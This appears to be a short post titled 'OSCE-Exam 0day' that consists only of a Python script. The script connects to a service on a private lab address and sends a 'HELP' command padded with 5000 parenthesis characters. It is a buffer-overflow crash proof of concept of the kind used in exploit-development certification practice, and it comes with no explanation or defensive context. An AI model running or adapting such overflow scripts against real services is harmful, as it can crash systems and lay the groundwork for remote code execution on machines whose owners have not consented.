# OSCE-Exam 0day 

```
#!/usr/bin/python
import socket
import os
import sys

Buffer="HELP "  + "(" * 5000

RHOST=('192.168.39.201')
RPORT=4321

Payload = socket.socket ( socket.AF_INET , socket.SOCK_STREAM )
Payload.connect((RHOST, RPORT))
Payload.recv(1024)
Payload.send(Buffer)
Payload.close()
```
